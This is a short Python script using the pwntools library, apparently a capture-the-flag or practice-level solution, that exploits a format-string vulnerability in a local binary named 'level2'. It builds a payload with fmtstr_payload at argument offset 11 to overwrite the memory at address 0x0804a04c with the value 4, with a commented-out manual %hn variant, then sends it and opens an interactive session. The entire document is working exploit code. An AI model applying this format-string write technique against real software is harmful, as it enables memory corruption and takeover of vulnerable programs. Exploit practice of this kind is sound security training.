from pwn import *

target = 0x0804a04c


#payload = p32(target)
#payload += b"%11$hn"

payload = fmtstr_payload(11, {target: 4})

p = process("./level2")
p.sendlineafter(b"!\n", payload)
p.interactive()